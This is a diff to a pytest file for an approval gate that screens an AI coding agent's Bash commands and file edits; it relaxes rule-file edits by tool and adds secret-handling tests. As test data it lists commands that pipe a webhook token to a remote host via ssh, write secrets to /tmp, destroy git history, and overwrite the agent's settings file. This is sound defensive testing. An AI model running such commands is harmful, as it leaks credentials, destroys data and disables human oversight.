@@ -126,8 +126,9 @@ def test_heredoc_into_interpreter_is_scanned():
 
 def test_writing_rule_file_is_protected():
     assert bash(f"cat > config/approval.toml <<'EOF'\n{DANGER_TEXT}EOF").rule == "보호-설정파일"
-    assert d("Write", file_path=f"{REPO}/config/approval.toml", content=DANGER_TEXT).rule == "보호-설정파일"
-    assert d("Edit", file_path=f"{REPO}/config/notify.toml").rule == "보호-설정파일"
+    # 11-03: 도구 편집(Edit · Write)은 내용이 보여 통과 + 텔레그램 알림 — Bash 쓰기는 여전히 묻는다(아래 test_rule_file_tool_…)
+    assert d("Write", file_path=f"{REPO}/config/approval.toml", content=DANGER_TEXT).rule == "규칙파일-편집"
+    assert d("Edit", file_path=f"{REPO}/config/notify.toml").rule == "규칙파일-편집"
     assert d("Read", file_path=f"{REPO}/config/approval.toml").verdict == "allow"   # 읽기는 괜찮다
 
 
@@ -316,3 +317,45 @@ def test_history_rewrite_seen_in_real_data():
     """11-03 다시 돌려 보기에서 찾은 실제 명령(펫퍼민트) — 전에는 어느 규칙에도 안 걸렸다."""
     r = bash("git update-ref -d refs/original/refs/heads/main && git reflog expire --expire=now --all && git gc -q --prune")
     assert (r.verdict, r.rule) == ("ask", "git-기록파괴")
+
+
+# ── 11-03 "늘 Yes" 두 규칙 좁히기 ─────────────────────────────
+def test_rule_file_tool_edit_passes_but_bash_write_asks():
+    for tool in ("Edit", "Write"):
+        r = d(tool, file_path=f"{REPO}/config/approval.toml")
+        assert (r.verdict, r.rule) == ("allow", "규칙파일-편집"), r
+    assert d("Edit", file_path=os.path.expanduser("~/.claude/settings.json")).rule == "보호-설정파일"   # 게이트를 끌 수 있다
+    assert d("Write", file_path=f"{REPO}/scripts/foreman-decide.sh").rule == "보호-설정파일"
+    for cmd in ("echo x > config/approval.toml", "sed -i 's/a/b/' config/approval.toml", "cp /tmp/x config/notify.toml",
+                "cat > config/approval.toml <<'EOF'\nx\nEOF"):
+        assert bash(cmd).verdict == "ask", cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "grep -q '^FOREMAN_WEBHOOK_TOKEN=' .env.bridge && echo have",              # 있고 없음만
+    "sed -n 's/^FOREMAN_WEBHOOK_TOKEN=//p' .env.bridge | tr -d '\\n' | wc -c",  # 길이만
+    "sed -n 's/^T=//p' .env.bridge | sha256sum | cut -c1-12",                   # 해시 앞자리만
+    'test -n "$(sed -n \'s/^T=//p\' .env.bridge)" && echo ok',                   # 참 · 거짓만
+    'echo "len $(sed -n \'s/^T=//p\' .env.bridge | tr -d \'\\n\' | wc -c)"',
+    "printf -- '- 옛 값은 .env.bridge.before-rotate\\n' >> log/x.md",           # printf -- 글자
+])
+def test_secret_value_not_shown_passes(cmd):
+    assert bash(cmd).rule != "민감한-경로", cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "sed -n 's/^T=//p' .env.bridge",                                            # 값이 화면에
+    "sed -n 's/^T=//p' .env.bridge | ssh host 'cat'",                           # 받는 쪽이 찍을 수 있다
+    "cp -p .env.bridge /tmp/backup",                                            # 사본이 늘어난다
+    'test -n "$(sed -n \'s/^T=//p\' .env.bridge > /tmp/leak)"',                 # 치환 안 리다이렉트
+    "grep TOKEN .env.bridge",
+])
+def test_secret_value_shown_still_asks(cmd):
+    assert bash(cmd).rule == "민감한-경로", cmd
+
+
+def test_rule_file_read_copy_is_not_write():
+    assert bash("cp ~/.claude/settings.json ~/.claude/backups/settings.json.bak").rule != "보호-설정파일"
+    assert bash("cp /tmp/x ~/.claude/settings.json").rule == "보호-설정파일"
+    assert bash("mv ~/.claude/settings.json /tmp/x").rule == "보호-설정파일"          # 옮겨 없앤다
+    assert bash("sed -i 's/a/b/' ~/.claude/settings.json").rule == "보호-설정파일"
